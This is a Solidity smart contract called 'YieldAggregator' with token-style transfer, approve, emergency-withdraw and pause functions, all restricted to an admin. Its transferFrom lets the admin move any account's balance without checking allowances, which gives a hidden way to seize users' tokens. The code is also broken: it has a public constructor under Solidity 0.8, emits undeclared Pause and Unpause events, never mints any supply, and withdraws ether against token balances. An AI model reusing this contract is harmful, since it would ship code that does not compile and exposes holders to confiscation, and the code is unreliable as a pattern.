// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract YieldAggregator {
    address private _admin;
    address private _pauser;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() public {
        _admin = msg.sender;
        _pauser = address(0);
        _totalSupply = 0;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(msg.sender == _admin, "Only admin can transfer");
        require(recipient != address(0), "Invalid recipient");

        _balances[msg.sender] = _balances[msg.sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        require(msg.sender == _admin, "Only admin can approve");
        require(spender != address(0), "Invalid spender");

        _allowances[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(msg.sender == _admin, "Only admin can transfer");
        require(sender != address(0), "Invalid sender");
        require(recipient != address(0), "Invalid recipient");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function emergencyWithdraw() public {
        require(msg.sender == _admin, "Only admin can withdraw");

        uint256 balance = _balances[msg.sender];
        _balances[msg.sender] = 0;

        payable(msg.sender).transfer(balance);

        emit Transfer(msg.sender, address(0), balance);
    }

    function pauseOperations() public {
        require(msg.sender == _admin, "Only admin can pause");

        _pauser = msg.sender;

        emit Pause();
    }

    function resumeOperations() public {
        require(msg.sender == _pauser, "Only pauser can resume");

        _pauser = address(0);

        emit Unpause();
    }
}